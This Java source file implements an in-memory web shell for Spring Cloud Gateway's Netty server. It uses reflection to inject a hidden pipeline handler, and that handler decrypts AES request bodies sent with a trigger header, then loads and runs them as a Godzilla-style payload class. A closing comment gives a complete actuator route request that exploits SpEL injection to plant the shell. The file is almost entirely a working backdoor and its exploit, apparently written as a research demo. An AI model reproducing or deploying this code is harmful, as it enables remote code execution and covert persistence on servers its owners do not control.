package com.example.gatewaydemo;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.*;
import io.netty.handler.codec.http.*;
import io.netty.util.CharsetUtil;
import reactor.netty.ChannelPipelineConfigurer;
import reactor.netty.ConnectionObserver;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.SocketAddress;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.AbstractMap;
import java.util.Map;
import java.util.Scanner;

/**
 * @auther Skay
 * @date 2022/4/19 17:29
 * @description
 */
public class NettyMemshell extends ChannelDuplexHandler implements ChannelPipelineConfigurer {

    public NettyMemshell(){

    }


    public static String doInject(){
        String msg = "inject-start";
        try {
            Method getThreads = Thread.class.getDeclaredMethod("getThreads");
            getThreads.setAccessible(true);
            Object threads = getThreads.invoke(null);

            for (int i = 0; i < Array.getLength(threads); i++) {
                Object thread = Array.get(threads, i);
                if (thread != null && thread.getClass().getName().contains("NettyWebServer")) {
                    Field _val$disposableServer = thread.getClass().getDeclaredField("val$disposableServer");
                    _val$disposableServer.setAccessible(true);
                    Object val$disposableServer = _val$disposableServer.get(thread);
                    Field _config = val$disposableServer.getClass().getSuperclass().getDeclaredField("config");
                    _config.setAccessible(true);
                    Object config = _config.get(val$disposableServer);
                    Field _doOnChannelInit = config.getClass().getSuperclass().getSuperclass().getDeclaredField("doOnChannelInit");
                    _doOnChannelInit.setAccessible(true);
                    _doOnChannelInit.set(config, new NettyMemshell());
                    msg = "inject-success";
                }
            }
        }catch (Exception e){
            msg = "inject-error";
        }
        return msg;
    }

    String xc = "3c6e0b8a9c15224a";
    String pass = "pass";
    String md5 = md5(pass + xc);

    private static Class defClass(byte[] classbytes)throws Exception{
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0],Thread.currentThread().getContextClassLoader());
        Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        method.setAccessible(true);
        return (Class) method.invoke(urlClassLoader,classbytes,0,classbytes.length);
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch(Exception e) {
            return null;
        }
    }
    public static String md5(String s) {
        String ret = null;
        try {
            java.security.MessageDigest m;
            m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch(Exception e) {}
        return ret;
    }
    public static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[] {
                    byte[].class
            }).invoke(Encoder, new Object[] {
                    bs
            });
        } catch(Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[] {
                        byte[].class
                }).invoke(Encoder, new Object[] {
                        bs
                });
            } catch(Exception e2) {}
        }
        return value;
    }
    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[] {
                    String.class
            }).invoke(decoder, new Object[] {
                    bs
            });
        } catch(Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[] {
                        String.class
                }).invoke(decoder, new Object[] {
                        bs
                });
            } catch(Exception e2) {}
        }
        return value;
    }

    @Override
    // Step1. 作为一个ChannelPipelineConfigurer给pipline注册Handler
    public void onChannelInit(ConnectionObserver connectionObserver, Channel channel, SocketAddress socketAddress) {
        ChannelPipeline pipeline = channel.pipeline();
        // 将内存马的handler添加到spring层handler的前面
        pipeline.addBefore("reactor.left.httpTrafficHandler","memshell_handler",new NettyMemshell());
    }


    private static ThreadLocal<AbstractMap.SimpleEntry<HttpRequest,ByteArrayOutputStream>> requestThreadLocal = new ThreadLocal<>();
    private static   Class payload;

    @Override
    // Step2. 作为Handler处理请求，在此实现内存马的功能逻辑
    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
        if (msg instanceof HttpRequest){
            HttpRequest httpRequest = (HttpRequest) msg;
            if (!httpRequest.headers().contains("skay")){
                ctx.fireChannelRead(msg);
                return;
            }
            AbstractMap.SimpleEntry<HttpRequest,ByteArrayOutputStream> simpleEntry = new AbstractMap.SimpleEntry(httpRequest,new ByteArrayOutputStream());
            requestThreadLocal.set(simpleEntry);
        }else if(msg instanceof HttpContent){
            HttpContent httpContent = (HttpContent)msg;
            AbstractMap.SimpleEntry<HttpRequest,ByteArrayOutputStream> simpleEntry = requestThreadLocal.get();
            if (simpleEntry == null){
                return;
            }
            HttpRequest httpRequest = simpleEntry.getKey();
            ByteArrayOutputStream contentBuf = simpleEntry.getValue();

            ByteBuf byteBuf = httpContent.content();
            int size = byteBuf.capacity();
            byte[] requestContent = new byte[size];
            byteBuf.getBytes(0,requestContent,0,requestContent.length);

            contentBuf.write(requestContent);

            if (httpContent instanceof LastHttpContent){
                try {
                    byte[] data =  x(contentBuf.toByteArray(), false);

                    if (payload == null) {
                        payload = defClass(data);
                        send(ctx,x(new byte[0], true),HttpResponseStatus.OK);
                    } else {
                        Object f = payload.newInstance();
                        //初始化内存流
                        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                        //将内存流传递给哥斯拉的payload
                        f.equals(arrOut);
                        //将解密后的数据传递给哥斯拉Payload
                        f.equals(data);
                        //通知哥斯拉Payload执行shell逻辑
                        f.toString();
                        //调用arrOut.toByteArray()获取哥斯拉Payload的输出
                        send(ctx,x(arrOut.toByteArray(), true),HttpResponseStatus.OK);
                    }
                } catch(Exception e) {
                    ctx.fireChannelRead(httpRequest);
                }
            }else {
                ctx.fireChannelRead(msg);
            }

        }

    }


    private void send(ChannelHandlerContext ctx, byte[] context, HttpResponseStatus status) {
        FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context));
        response.headers().set(HttpHeaderNames.CONTENT_TYPE, "text/plain; charset=UTF-8");
        ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);
    }
}

/*
POST /actuator/gateway/routes/shell HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 13901

{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{T(org.springframework.cglib.core.ReflectUtils).defineClass('NettyMemshell',T(org.springframework.util.Base64Utils).decodeFromString('classbase64'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}"
    }
  }],
  "uri": "http://example.com"
}
